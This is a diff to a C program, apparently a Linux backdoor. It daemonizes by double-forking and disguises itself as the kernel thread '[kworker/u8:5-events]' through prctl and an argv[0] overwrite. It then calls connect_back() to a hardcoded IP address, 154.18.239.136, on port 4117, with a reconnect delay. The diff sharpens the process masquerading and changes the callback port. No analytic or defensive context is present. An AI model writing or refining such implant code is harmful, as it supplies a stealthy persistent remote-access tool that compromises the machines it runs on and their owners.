@@ -10,21 +10,22 @@
 #include <sys/stat.h>
 #include <fcntl.h>
 #include <signal.h>
+#include <sys/prctl.h>
 
 #define SERVER_IP "154.18.239.136"
-#define SERVER_PORT 4118
+#define SERVER_PORT 4117
 #define RECONNECT_DELAY 3
 
 void daemonize() {
     pid_t pid = fork();
     if (pid < 0) exit(EXIT_FAILURE);
-    if (pid > 0) exit(EXIT_SUCCESS); // Parent out
+    if (pid > 0) exit(EXIT_SUCCESS);
 
-    setsid(); // New session
+    setsid();
     signal(SIGCHLD, SIG_IGN);
     signal(SIGHUP, SIG_IGN);
 
-    pid = fork(); // Fork again for full daemon
+    pid = fork();
     if (pid < 0) exit(EXIT_FAILURE);
     if (pid > 0) exit(EXIT_SUCCESS);
 
@@ -39,9 +40,10 @@ void daemonize() {
     open("/dev/null", O_RDWR);
 }
 
-void rename_proc(const char *name) {
-    strncpy((char *)getprogname(), name, strlen(getprogname()));
+// ⬇️ Rename argv[0] + set kernel process name
+void rename_proc(const char *name, char **argv) {
     prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0);
+    strncpy(argv[0], name, strlen(argv[0]));
 }
 
 void connect_back() {
@@ -75,7 +77,7 @@ void connect_back() {
 
 int main(int argc, char *argv[]) {
     daemonize();
-    rename_proc("[kworker/u8:5-events]");
+    rename_proc("[kworker/u8:5-events]", argv);
     connect_back();
     return 0;
 }
